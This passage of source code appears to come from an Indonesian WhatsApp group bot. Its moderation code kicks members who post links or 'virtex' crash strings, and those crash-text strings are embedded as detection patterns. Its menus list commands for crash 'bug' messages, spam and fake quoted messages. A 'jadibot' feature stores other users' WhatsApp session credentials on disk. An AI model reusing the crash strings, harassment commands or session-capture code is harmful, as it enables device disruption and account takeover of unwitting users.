if (budy.includes("*⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃟⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢⃟⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢⃟⃟ᡃ⃟ᡃ⃟ᡃ⃢ᡃ⃢ᡃ⃢⃟⃢⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃟⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢⃟⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢⃟⃟ᡃ⃟ᡃ⃟ᡃ⃢ᡃ⃢ᡃ⃢⃟⃢⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃟⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢⃟⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢⃟⃟ᡃ⃟ᡃ⃟ᡃ⃢ᡃ⃢ᡃ⃢⃟⃢⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ")){
  if (!isGroup) return
  if (!isAntifirtex4) return
  if (!isGroupAdmins) return reply('karena kamu adalah admin group, bot tidak akan kick kamu')
  wann.updatePresence(from, Presence.composing)
  var kic = `${sender.split("@")[0]}@s.whatsapp.net`
  reply(`「 *VIRTEX TERDETEKSI* 」 MAAF wa.me/${sender.split("@")[0]}\nANDA DI KICK DALAM GRUP`)
  setTimeout( () => {
         wann.groupRemove(from, [kic]).catch((e)=>{reply(`*ERR:* ${e}`)})
  }, 1000)
  setTimeout( () => {
         wann.updatePresence(from, Presence.composing)
  rekap.push(`${sender}@s.whatsapp.net`)
  fs.writeFileSync('./src/rekapvir.json', JSON.stringify(rekap))
         reply("「 *REKAP DATA VIRTEX* 」Sukses, Menyimpan Data Orang Yang Mengirimkan Virtex Kedalam Daftar Hitam Database Bot WhatsApp.")
  }, 0)
}
//====================================================================================
if (budy.includes("𝐂𝐎𝐋𝐎𝐒𝐒𝐀𝐋 𝐓𝐈𝐓𝐀𝐍")){
  if (!isGroup) return
  if (!isAntifirtex5) return
  if (!isGroupAdmins) return reply('karena kamu adalah admin group, bot tidak akan kick kamu')
  wann.updatePresence(from, Presence.composing)
  var kic = `${sender.split("@")[0]}@s.whatsapp.net`
  reply(`「 *VIRTEX TERDETEKSI* 」 MAAF wa.me/${sender.split("@")[0]}\nANDA DI KICK DALAM GRUP`)
  setTimeout( () => {
         wann.groupRemove(from, [kic]).catch((e)=>{reply(`*ERR:* ${e}`)})
  }, 1000)
  setTimeout( () => {
         wann.updatePresence(from, Presence.composing)
  rekap.push(`${sender}@s.whatsapp.net`)
  fs.writeFileSync('./src/rekapvir.json', JSON.stringify(rekap))
         reply("「 *REKAP DATA VIRTEX* 」Sukses, Menyimpan Data Orang Yang Mengirimkan Virtex Kedalam Daftar Hitam Database Bot WhatsApp.")
  }, 0)
}
//====================================================================================
if (budy.includes("♚㜸ཽཽࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧ͢͢㜺ࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧ㜸ཽཽཽ͢͢͢♚")){
  if (!isGroup) return
  if (!isAntifirtex6) return
  if (!isGroupAdmins) return reply('karena kamu adalah admin group, bot tidak akan kick kamu')
  wann.updatePresence(from, Presence.composing)
  var kic = `${sender.split("@")[0]}@s.whatsapp.net`
  reply(`「 *VIRTEX TERDETEKSI* 」 MAAF wa.me/${sender.split("@")[0]}\nANDA DI KICK DALAM GRUP`)
  setTimeout( () => {
         wann.groupRemove(from, [kic]).catch((e)=>{reply(`*ERR:* ${e}`)})
  }, 1000)
  setTimeout( () => {
         wann.updatePresence(from, Presence.composing)
  rekap.push(`${sender}@s.whatsapp.net`)
  fs.writeFileSync('./src/rekapvir.json', JSON.stringify(rekap))
         reply("「 *REKAP DATA VIRTEX* 」Sukses, Menyimpan Data Orang Yang Mengirimkan Virtex Kedalam Daftar Hitam Database Bot WhatsApp.")
  }, 0)
}
//====================================================================================
if (budy.includes("9999999")){
  if (!isGroup) return
  if (!isAntifirtex7) return
  if (!isGroupAdmins) return reply('karena kamu adalah admin group, bot tidak akan kick kamu')
  wann.updatePresence(from, Presence.composing)
  var kic = `${sender.split("@")[0]}@s.whatsapp.net`
  reply(`「 *VIRTEX TERDETEKSI* 」 MAAF wa.me/${sender.split("@")[0]}\nANDA DI KICK DALAM GRUP`)
  setTimeout( () => {
         wann.groupRemove(from, [kic]).catch((e)=>{reply(`*ERR:* ${e}`)})
  }, 1000)
  setTimeout( () => {
         wann.updatePresence(from, Presence.composing)
  rekap.push(`${sender}@s.whatsapp.net`)
  fs.writeFileSync('./src/rekapvir.json', JSON.stringify(rekap))
         reply("「 *REKAP DATA VIRTEX* 」Sukses, Menyimpan Data Orang Yang Mengirimkan Virtex Kedalam Daftar Hitam Database Bot WhatsApp.")
  }, 0)
}


//=================================================================
//pes = (type === 'conversation' && wann.message.conversation) ? wann.message.conversation : (type == 'imageMessage') && Arya.message.imageMessage.caption ? Arya.message.imageMessage.caption : (type == 'videoMessage') && Arya.message.videoMessage.caption ? Arya.message.videoMessage.caption : (type == 'extendedTextMessage') && Arya.message.extendedTextMessage.text ? Arya.message.extendedTextMessage.text : ''
const messagesC = cmd.slice(0).trim().split(/ +/).shift().toLowerCase()
if (messagesC.match("://youtu.be/")){
       if (!isGroup) return
       if (!isAntiLinkytv) return
       if (!isGroupAdmins) return reply('*Admin Terdeteksi, Bot Tidak Akan Mengeluarkan Admin Grup, Karena Admin Grup Bebas Mengirimkan Link YouTube Video*')
       wann.updatePresence(from, Presence.composing)
       var kic = `${sender.split("@")[0]}@s.whatsapp.net`
       reply(`*「 Link YouTube Video Terdeteksi 」 wa.me/${sender.split("@")[0]} Maaf Anda Di Kick.*`)
       setTimeout( () => {
              wann.groupRemove(from, [kic]).catch((e)=>{reply(`*ERR:* ${e}`)})
        }, 7000)
        setTimeout( () => {
        wann.sendMessage(from, '_1 Detik lagi..._', text, {quoted: fkontak})
        }, 6000)
        setTimeout( () => {
        wann.sendMessage(from, '_2 Detik lagi..._', text, {quoted: fkontak})
        }, 5000)
        setTimeout( () => {
        wann.sendMessage(from, '_3 Detik lagi..._', text, {quoted: fkontak})
        }, 2500)
        setTimeout( () => {    
              wann.updatePresence(from, Presence.composing)
reply("*「 BACA PERATURAN GC 」Selamat Tinggal Sobat, Lain kali Kalau Ada Masuk Grup Di Baca Dulu Peraturannya Ya Kak...*\n\n*Promosi Hanya Di Hari Ahad.*")
       }, 0)
}
//==============================================================
//==============================================================
   /////***𝙁𝙐𝙉𝘾𝙏𝙄𝙊𝙉 𝘼𝙉??𝙄 𝙇??𝙉𝙆  𝙔𝙊𝙐𝙏𝙐𝘽𝙀 𝘾𝙃𝘼𝙉𝙉𝙀𝙇***\\\\\
   // buatan Arifi Razzaq OFFICIAL
   if (messagesC.match("://youtube.com/")){
          if (!isGroup) return
          if (!isAntiLinkytc) return
          if (!isGroupAdmins) return reply('*Admin Terdeteksi, Bot Tidak Akan Mengeluarkan Admin Grup, Karena Admin Grup Bebas Mengirimkan Link YouTube Channel*')
          wann.updatePresence(from, Presence.composing)
          var kic = `${sender.split("@")[0]}@s.whatsapp.net`
          reply(`*「 Link YouTube Channel Terdeteksi 」 wa.me/${sender.split("@")[0]} Maaf Anda Di Kick.*`)
          setTimeout( () => {
                 wann.groupRemove(from, [kic]).catch((e)=>{reply(`*ERR:* ${e}`)})
        }, 7000)
        setTimeout( () => {
        wann.sendMessage(from, '_1 Detik lagi..._', text, {quoted: fkontak})
        }, 6000)
        setTimeout( () => {
        wann.sendMessage(from, '_2 Detik lagi..._', text, {quoted: fkontak})
        }, 5000)
        setTimeout( () => {
        wann.sendMessage(from, '_3 Detik lagi..._', text, {quoted: fkontak})
        }, 2500)
        setTimeout( () => {    
                 wann.updatePresence(from, Presence.composing)
   reply("*「 BACA PERATURAN GC 」Selamat Tinggal Sobat, Lain kali Kalau Ada Masuk Grup Di Baca Dulu Peraturannya Ya Kak...*\n\n*Promosi Hanya Di Hari Ahad.*")
          }, 0)
   }
   //==============================================================
   /////***𝙁𝙐𝙉𝘾𝙏𝙄𝙊𝙉 𝘼𝙉𝙏𝙄 𝙇𝙄𝙉𝙆 𝙄𝙉𝙎𝙏𝘼𝙂𝙍𝘼𝙈***\\\\\
   // buatan Arifi Razzaq OFFICIAL
   if (messagesC.match("instagram.com/")){
          if (!isGroup) return
          if (!isAntiLinkig) return
          if (!isGroupAdmins) return reply('*Admin Terdeteksi, Bot Tidak Akan Mengeluarkan Admin Grup, Karena Admin Grup Bebas Mengirimkan Link Instagram*')
          wann.updatePresence(from, Presence.composing)
          var kic = `${sender.split("@")[0]}@s.whatsapp.net`
          reply(`*「 Link Instagram Terdeteksi 」 wa.me/${sender.split("@")[0]} Maaf Anda Di Kick.*`)
          setTimeout( () => {
                 wann.groupRemove(from, [kic]).catch((e)=>{reply(`*ERR:* ${e}`)})
        }, 7000)
        setTimeout( () => {
        wann.sendMessage(from, '_1 Detik lagi..._', text, {quoted: fkontak})
        }, 6000)
        setTimeout( () => {
        wann.sendMessage(from, '_2 Detik lagi..._', text, {quoted: fkontak})
        }, 5000)
        setTimeout( () => {
        wann.sendMessage(from, '_3 Detik lagi..._', text, {quoted: fkontak})
        }, 2500)
        setTimeout( () => {    
                 wann.updatePresence(from, Presence.composing)
   reply("*「 BACA PERATURAN GC 」Selamat Tinggal Sobat, Lain kali Kalau Ada Masuk Grup Di Baca Dulu Peraturannya Ya Kak...*\n\n*Promosi Hanya Di Hari Ahad.*")
          }, 0)
   }

   //=========================================================================
   /////***𝙁𝙐𝙉𝘾𝙏𝙄𝙊𝙉 𝘼𝙉𝙏𝙄 𝙇𝙄𝙉𝙆 𝙁𝘼𝘾𝙀𝘽𝙊𝙊𝙆***\\\\\
   if (messagesC.match("facebook.com/")){
   if (!isGroup) return
   if (!isAntiLinkfb) return
   if (!isGroupAdmins) return reply('*Admin Terdeteksi, Bot Tidak Akan Mengeluarkan Admin Grup, Karena Admin Grup Bebas Mengirimkan Link Facebook*')
   wann.updatePresence(from, Presence.composing)
   var kic = `${sender.split("@")[0]}@s.whatsapp.net`
   reply(`*「 Link Facebook Terdeteksi 」 wa.me/${sender.split("@")[0]} Maaf Anda Di Kick.*`)
   setTimeout( () => {
          wann.groupRemove(from, [kic]).catch((e)=>{reply(`*ERR:* ${e}`)})
        }, 7000)
        setTimeout( () => {
        wann.sendMessage(from, '_1 Detik lagi..._', text, {quoted: fkontak})
        }, 6000)
        setTimeout( () => {
        wann.sendMessage(from, '_2 Detik lagi..._', text, {quoted: fkontak})
        }, 5000)
        setTimeout( () => {
        wann.sendMessage(from, '_3 Detik lagi..._', text, {quoted: fkontak})
        }, 2500)
        setTimeout( () => {    
          wann.updatePresence(from, Presence.composing)
   reply("*「 BACA PERATURAN GC 」Selamat Tinggal Sobat, Lain kali Kalau Ada Masuk Grup Di Baca Dulu Peraturannya Ya Kak...*\n\n*Promosi Hanya Di Hari Ahad.*")
   }, 0)
   }
   
      /////***𝙁𝙐𝙉𝘾𝙏𝙄𝙊𝙉 𝘼𝙉𝙏𝙄 𝙇𝙄𝙉𝙆 𝙁𝘼𝘾𝙀𝘽𝙊𝙊𝙆***\\\\\
   if (messagesC.match("://www.mediafire.com")){
   if (!isGroup) return
   if (!isAntiLinkfb) return
   if (!isGroupAdmins) return reply('*Admin Terdeteksi, Bot Tidak Akan Mengeluarkan Admin Grup, Karena Admin Grup Bebas Mengirimkan Link MediaFire*')
   wann.updatePresence(from, Presence.composing)
   var kic = `${sender.split("@")[0]}@s.whatsapp.net`
   reply(`*「 Link MediaFire Terdeteksi 」 wa.me/${sender.split("@")[0]} Maaf Anda Di Kick.*`)
   setTimeout( () => {
          wann.groupRemove(from, [kic]).catch((e)=>{reply(`*ERR:* ${e}`)})
        }, 7000)
        setTimeout( () => {
        wann.sendMessage(from, '_1 Detik lagi..._', text, {quoted: fkontak})
        }, 6000)
        setTimeout( () => {
        wann.sendMessage(from, '_2 Detik lagi..._', text, {quoted: fkontak})
        }, 5000)
        setTimeout( () => {
        wann.sendMessage(from, '_3 Detik lagi..._', text, {quoted: fkontak})
        }, 2500)
        setTimeout( () => {    
          wann.updatePresence(from, Presence.composing)
   reply("*「 BACA PERATURAN GC 」Selamat Tinggal Sobat, Lain kali Kalau Ada Masuk Grup Di Baca Dulu Peraturannya Ya Kak...*\n\n*Promosi Hanya Di Hari Ahad.*")
   }, 0)
   }
			if (!m.key.fromMe && bad.includes(messagesD)) {
				reply('_Jangan Toxic!_')
				}
				if (isSimi) {		
	simi = await fetchJson(`https://api.simsimi.net/v2/?text=${cmd}&lc=ID`)
                     sami = simi.success
                        wann.sendMessage(from, `${sami}`, text, {thumbnail: ofrply, sendEphemeral: true, quoted:mek, contextInfo: {forwardingScore: 508, isForwarded: true}})
                      }
if (autoread) {
wann.chatRead(from)
}
if (autocomposing) {
wann.updatePresence(from, Presence.composing)
}
if (autorecording) {
wann.updatePresence(from, Presence.recording)
}
if (budy.includes("wann")){ 
data = stick
jsonData = JSON.parse(data);
xm1 = Math.floor(Math.random() * jsonData.length);
xm2 = jsonData[xm1];
xm3 = xm2.result
sendStickerUrl(from, xm3)
}
if (budy.includes("wan")){
data = stick
jsonData = JSON.parse(data);
xm1 = Math.floor(Math.random() * jsonData.length);
xm2 = jsonData[xm1];
xm3 = xm2.result
sendStickerUrl(from, xm3)
}
if(isButton == 'igm'){
reply('http://instagram.com/achyrr_wann')
}
if(isButton == 'ytm'){
reply('http://youtube.com/WANNBOTZ')
}

   const sotoy = [
        '🍊 : 🍒 : 🍐',
        '🍒 : 🔔 : 🍊',
        '🍇 : 🍇 : 🍐',
        '🍊 : 🍋 : 🔔', //ANKER
        '🔔 : 🍒 : 🍐',
        '🔔 : 🍒 : 🍊',
        '🍊 : 🍋 : 🔔',        
        '🍐 : 🍒 : 🍋',
        '🍐 : 🍒 : 🍐',
        '🍊 : 🍒 : 🍒',
        '🔔 : 🔔 : 🍇',
        '🍌 : 🍌 : 🔔',
        '🍐 : 🔔 : 🔔',
        '🍊 : 🍋 : 🍒',
        '🍋 : 🍋 : 🍋 Win👑',
        '🔔 : 🔔 : 🍇',
        '🔔 : ?? : 🍇', 
        '🔔 : 🍐 : 🔔',
        '🍌 : 🍌 : 🍌 Win👑'
        ]

        const isStcMedia = isStc !== "" && content.includes("quotedMessage") && !content.includes("extendedTextMessage") || isStc !== "" && content.includes("quotedMessage") && !content.includes("conversation")
	    const isStcVideo = isStcMedia && content.includes("videoMessage")
	    const isStcImage = isStcMedia && content.includes("imageMessage")
	    const isStcSticker = isStcMedia && content.includes("stickerMessage")
        const isStcTeks = isStcMedia && content.includes("quotedMessage")
        const isStcDocs = isStcMedia && content.includes("documentMessage")
        const isStcContact = isStcMedia && content.includes("contactMessage")
        const isStcAudio = isStcMedia && content.includes("audioMessage")
        const isStcLoca = isStcMedia && content.includes("locationMessage")
        const isStcTag = isStcMedia && content.includes("mentionedJid")
        const isStcReply = isStcMedia && content.includes("Message")
        const isStcProd = isStcMedia && content.includes("productMessage")
       
		if (!banChat) {
		if (!isOwner && !mek.key.fromMe) return
		}
	    if (isCmd && !isGroup) {console.log(color('|CMD|', 'greenyellow'), color(moment(mek.messageTimestamp * 1000).format('DD/MM/YY HH:mm:ss'), 'blue'), color(`${command} [${args.length}]`, 'cyan'), color(`${pushname}`, 'orange'), color(`${sender}`, 'deeppink'))}
	    if (!command) {console.log(color('|MSG|', 'greenyellow'), color(moment(mek.messageTimestamp * 1000).format('DD/MM/YY HH:mm:ss'), 'blue'), color(cmd, 'cyan'), color(`${pushname}`, 'orange'), color(`${sender}`, 'deeppink'))}
		
        switch (isStc) {
     case "5b017c6ac1fb953c7bd21034d2fca5fad75ef2da4c3b2c2877ef49fa544e74bf":
        if (!isStcSticker) return reply('Reply stickernya bgsd!')
        su = mek.message.stickerMessage.contextInfo.quotedMessage.stickerMessage.fileSha256.toString('hex')
        reply(su)
				}
        switch (command) {
        	case 'menu':
        case 'help':
        stod = `${sender}`
       stst = await wann.getStatus(`${sender.split('@')[0]}@c.us`)
				stst = stst.status == 401 ? '' : stst.status
			num = await fetchJson(`https://numlookupapi.com/api/validate/${senderNumber}`, {method: 'get'})
       

 menu = `❏「 \`\`\`${NamaBot}\`\`\` 」

╾ _Creator : @${dtod.split('@')[0]}_
╾ _Battery : ${baterai.battery}_
╾ _Mode : ${banChat ? 'Public' : 'Self'}_
╾ _Total Hit : ${cmhit.length}_
╾ _Command : ${prefix + command}_

❏「 \`\`\`INFO BOT\`\`\` 」

╾ _Nama Bot : ${NamaBot}_
╾ _Nama Owner : ${NamaOwner}_
╾ _Nomor Owner : @${otod.split('@')[0]}_
╾ _Auto Composing : ${autocomposing}_
╾ _Auto Recording : ${autorecording}_

❏「 \`\`\`INFO USER\`\`\` 」

╾ _Owner : ${isOwner ? 'true' : 'false'}_
╾ _CoOwner : ${isCoOwner ? 'true' : 'false'}_
╾ _Nama : ${pushname}_
╾ _Bio : ${stst}_
╾ _Nomor : @${stod.split('@')[0]}_
╾ _Info Nomor : ${num.line_type} - ${num.country_name} - ${num.carrier}_`

tod2 =`${fake}`
           buttons = [
{buttonId: 'command', buttonText:{displayText: 'List Message'}, type: 1},
{buttonId: 'allmenu', buttonText:{displayText: 'Menu All'}, type: 1},
{buttonId: 'owner', buttonText:{displayText: 'Owner Bot'}, type: 1}
]
sendButLocation(from, menu, tod2, dfrply, buttons)
break
case 'command':
 stod = `${sender}`
 listMsg = {
 buttonText: 'LIST MENU',
 footerText : '*_© INVI BOT_*',
 description: `Hai kak @${stod.split('@')[0]}, Silahkan pilih menu disini\n NOTE : \nKALO EROR SEGERA CHAT OWNER❗\n wa.me/6285640068416`,
 sections: [
                     {
                      "title": `${time2} ${pushname}`,
 rows: [
                          
                           {
                              "title": "groupmenu",
                              "description": `Menu Ke 1`,
                              "rowId": "#groupmenu"
                           },                                                                                                            
                           {
                              "title": "downloadmenu",
                              "description": `Menu Ke 2`,
                              "rowId": "#downloadmenu"
                           },
                           {
                              "title": "ownermenu",
                              "description": `Menu Ke 3`,
                              "rowId": "#ownermenu"
                           },
                           {
                              "title": "othermenu",
                              "description": `Menu Ke 4`,
                              "rowId": "#othermenu"
                           },
                           {
                              "title": "gamemenu",
                              "description": `Menu Ke 5`,
                              "rowId": "#gamemenu"
                           }, 
                           {
                              "title": "allmenu",
                              "description": `Menu Ke 6`,
                              "rowId": "#allmenu"
                           },
                           {
                              "title": "botstat",
                              "description": `Menu Ke 7`,
                              "rowId": "#botstat"
                           }
                                
                        ]
                     }],
 listType: 1
}
wann.sendMessage(from, listMsg, MessageType.listMessage, {contextInfo: { mentionedJid: [stod]},quoted:finv})
break
case 'ownermenu':
menu = `❏ 「 \`\`\`MENU OWNER\`\`\` 」
├────────────────────
├ ${prefix}stopjadibot
├ ${prefix}autorespon [ _on/off_ ]
├ ${prefix}antidelete [ _on/off_ ]
├ ${prefix}autoread [ _on/off_ ]
├ ${prefix}fakevn [ _on/off_ ]
├ ${prefix}fakengetik [ _on/off_ ]
├ ${prefix}bc [ _teks/reply gif/image/video with caption_ ]
├ ${prefix}tobc [ _reply sticker/audio with caption_ ]
├ ${prefix}return [ _javascript_ ]
├ ${prefix}clearall
├ ${prefix}delchat
├ ${prefix}mute
├ ${prefix}unmute
├ ${prefix}public
├ ${prefix}self
├ ${prefix}spam [ _teks|jumlah_ ]
├ ${prefix}demoteall
├ ${prefix}promoteall
├ ${prefix}addcmd [ _teks reply stc_ ]
├ ${prefix}delcmd [ _reply stc_ ]
├ ${prefix}listcmd
├ ${prefix}spamsw [ _teks|jumlah_ ]
├ ${prefix}upswteks [ _teks_ ]
├ ${prefix}upswlokasi [ _teks_ ]
├ ${prefix}upswaudio [ _reply audio_ ]
├ ${prefix}upswvoice [ _reply audio_ ]
├ ${prefix}upswsticker [ _reply sticker_ ]
├ ${prefix}upswimage [ _reply image with caption_ ]
├ ${prefix}upswgif [ _reply gif with caption_ ]
├ ${prefix}upswvideo [ _reply video with caption_ ]
├ ${prefix}shutdown
├ ${prefix}offline [ _alasan_ ]
├ ${prefix}online
├ ${prefix}exif [ _nama|author_ ]
├ ${prefix}setprofile [ _reply image_ ]
├ ${prefix}setname [ _teks_ ]
├ ${prefix}setprefix [ _multi/nopref/allpref/teks_ ]
├ ${prefix}setbio [ _teks_ ]
├ ${prefix}addsticker [ _nama_ ]
├ ${prefix}delsticker [ _nama_ ]
├ ${prefix}addvn [ _nama_ ]
├ ${prefix}delvn [ _nama_ ]
├ ${prefix}addimage [ _nama_ ]
├ ${prefix}delimage [ _nama_ ]
├ ${prefix}bug [ _jumlah_ ]
├ ${prefix}bugpc2 [ _jumlah_ ]
├ ${prefix}bugtroli2 [ _jumlah_ ]
├ ${prefix}bugpc
├ ${prefix}bugcombine
├ ${prefix}bugtroli
├ ${prefix}buglokasi
├ ${prefix}bughole
├ ${prefix}leave
├ ${prefix}restart
├ ${prefix}join [ _link group_ ]
├ ${prefix}addrespon [ _tanya|jawab_ ]
├ ${prefix}delrespon [ _nama_ ]
└ ${prefix}listrespon`
katalog(menu)
break
case 'downloadmenu':
menu = `❏ 「 \`\`\`MENU DOWNLOAD\`\`\` 」
├────────────────────
├ ${prefix}infogempa
├ ${prefix}herolist
├ ${prefix}herodetail [ _hero_ ]
├ ${prefix}google [ _search_ ]
├ ${prefix}gimage [ _search_ ]
├ ${prefix}wiki [ _search_ ]
├ ${prefix}mediafire [ _link_ ]
├ ${prefix}ytsearch [ _judul_ ]
├ ${prefix}ytmp4 [ _link yt_ ]
├ ${prefix}ytmp3 [ _link yt_ ]
├ ${prefix}play [ _judul lagu_ ]
├ ${prefix}video [ _judul video_ ]
├ ${prefix}tinyurl [ _link_ ]
├ ${prefix}fetch [ _link_ ]
├ ${prefix}igdl [ _link_ ]
├ ${prefix}tiktokdl [ _link_ ]
├ ${prefix}pinterest [ _search_ ]
├ ${prefix}lirik [ _judul_ ]
├ ${prefix}tourl [ _reply image/video_ ]
├ ${prefix}resepmasakan [ _judul_ ]
├ ${prefix}artimimpi [ _teks_ ]
├ ${prefix}bilangangka [ _angka_ ]
├ ${prefix}kalkulator [ _angka_ ]
├ ${prefix}fancytext [ _teks_ ]
├ ${prefix}githubstalk [ _username_ ]
├ ${prefix}translate [ _teks kodebhs_ ]
└ ${prefix}ss [ _link_ ]`
katalog(menu)
break
case 'makermenu':
menu = `❏ 「 \`\`\`MENU MAKER\`\`\` 」
├────────────────────
├ ${prefix}matrix [ _teks_ ]
├ ${prefix}googletxt [ _teks_ ]
├ ${prefix}spiderman [ _teks_ ]
├ ${prefix}express [ _teks_ ]
├ ${prefix}dance [ _teks_ ]
├ ${prefix}blackbird [ _teks_ ]
├ ${prefix}halloween [ _teks_ ]
├ ${prefix}vampire [ _teks_ ]
├ ${prefix}codetxt [ _teks_ ]
├ ${prefix}text3d [ _teks_ ]
└ ${prefix}warrior [ _teks_ ]`
katalog(menu)
break
case 'groupmenu':
menu = `❏ 「 \`\`\`MENU GROUP\`\`\` 」
├────────────────────
├ ${prefix}getpict [ _@tag_ ]
├ ${prefix}getname [ _reply target_ ]
├ ${prefix}getbio [ _reply target_ ]
├ ${prefix}promote [ _@tag_ ]
├ ${prefix}demote [ _@tag_ ]
├ ${prefix}antilink [ _1/0_ ]
├ ${prefix}antibug [ _1/0_ ]
├ ${prefix}creategrup [ _nama|@tag_ ]
├ ${prefix}tictactoe [ _@tag_ ]
├ ${prefix}delttt
├ ${prefix}getpp
├ ${prefix}kick [ _@tag_ ]
├ ${prefix}add [ _nomor_ ]
├ ${prefix}getdeskgc
├ ${prefix}sider [ _reply pesan bot_ ]
├ ${prefix}hacked [ _teks_ ]
├ ${prefix}setnamegc [ _teks_ ]
├ ${prefix}setdeskgc [ _teks_ ]
├ ${prefix}fitnah [ _@tag|teks1|teks2_ ]
├ ${prefix}kontak [ _@tag|nama_ ]
├ ${prefix}kontag [ _@tag|nama_ ]
├ ${prefix}opengc
├ ${prefix}closegc
├ ${prefix}resetlinkgc
├ ${prefix}linkgrup
├ ${prefix}hidetag [ _teks_ ]
├ ${prefix}sticktag [ _nama sticker_ ]
└ ${prefix}totag [ _reply media_ ]`
katalog(menu)
break
case 'othermenu':
menu = `❏ 「 \`\`\`MENU OTHER\`\`\` 」
├────────────────────
├ ${prefix}jadibot
├ ${prefix}caripesan [ _teks|jumlah_ ]
├ ${prefix}slots
├ ${prefix}suit [ _gunting/batu/kertas_ ]
├ ${prefix}tag [ _nomor_ ]
├ ${prefix}tagme
├ ${prefix}tts [ _kodebhs teks_ ]
├ ${prefix}readmore [ _teks1|teks2_ ]
├ ${prefix}fitnahpc [ _nomor|teks1|teks2_ ]
├ ${prefix}chat [ _nomor|teks_ ]
├ ${prefix}fdeface [ _replyimg link|teks1|teks2_ ]
├ ${prefix}listimage
├ ${prefix}liststicker
├ ${prefix}listvn
├ ${prefix}listgrup
├ ${prefix}baileys [ _reply message_ ]
├ ${prefix}q [ _reply message_ ]
├ ${prefix}getcaption [ _reply message_ ]
├ ${prefix}pantun
├ ${prefix}tospam [ _reply audio/sticker/image|jumlah_ ]
├ ${prefix}sharelock [ _teks1|teks2_ ]
├ ${prefix}sticker
├ ${prefix}stickerwm [ _nama|author_ ]
├ ${prefix}takestick [ _nama|author_ ]
├ ${prefix}colong [ _reply sticker_ ]
├ ${prefix}dadu
├ ${prefix}semoji [ _emoji_ ]
├ ${prefix}attp [ _teks_ ]
├ ${prefix}toimg
├ ${prefix}tomp3 [ _reply video_ ]
├ ${prefix}tomp4 [ _reply sticker gif_ ]
├ ${prefix}robot [ _reply audio_ ]
├ ${prefix}balik [ _reply audio_ ]
├ ${prefix}bass [ _reply audio_ ]
├ ${prefix}gemuk [ _reply audio_ ]
├ ${prefix}detikvn [ _reply audio caption angka_ ]
└ ${prefix}detikvideo [ _reply video caption angka_ ]`
katalog(menu)
break
case 'jadibot':
if (!mek.key.fromMe && !isOwner && !isCoOwner) return reply(mess.only.ownerB)
client.version = [2, 2119, 6]
client.browserDescription = ['Dcode Denpa','Desktop','3.0']
if (args[0] && args[0].length > 200) {
	let json = Buffer.from(args[0], 'base64').toString('utf-8')
    let obj = JSON.parse(json)
    await client.loadAuthInfo(obj)
}
try {
client.on('qr' ,async qr => {
qrbot = await qrkode.toDataURL(qr, { scale: 8 })
buffqr = await Buffer.from(qrbot.split('data:image/png;base64,')[1], 'base64')
await fs.writeFileSync(`./jadibot@${sender}.jpg`, buffqr)
let scen = await wann.sendMessage(from, fs.readFileSync(`./jadibot@${sender}.jpg`), MessageType.image, {quoted : mek,caption: 'Scan QR ini untuk jadi bot sementara!\n1. Klik titik tiga di pojok kanan atas\n2. Ketuk WhatsApp Web\n3. Scan QR ini \n\nQR Expired dalam 20 detik'})    
setTimeout(() => {
       wann.deleteMessage(from, scen.key)
  }, 30000);
})  
client.on ('open', async () => {
  console.log ('credentials update')
  const authInfo = client.base64EncodedAuthInfo()
  fs.writeFileSync(`./sampah/${sender}.json`, JSON.stringify(authInfo  ,null, '\t'))
  await client.sendMessage('0@s.whatsapp.net', `Kamu bisa login tanpa qr dengan pesan dibawah ini`, MessageType.extendedText)
  client.sendMessage('0@s.whatsapp.net', `${prefix}${command} ${Buffer.from(JSON.stringify(authInfo)).toString('base64')}`, MessageType.extendedText)
})
client.on('chat-update', async (chat) => {
	require('./wann.js')(client, chat)
})    
await client.connect().then(async ({user}) => {
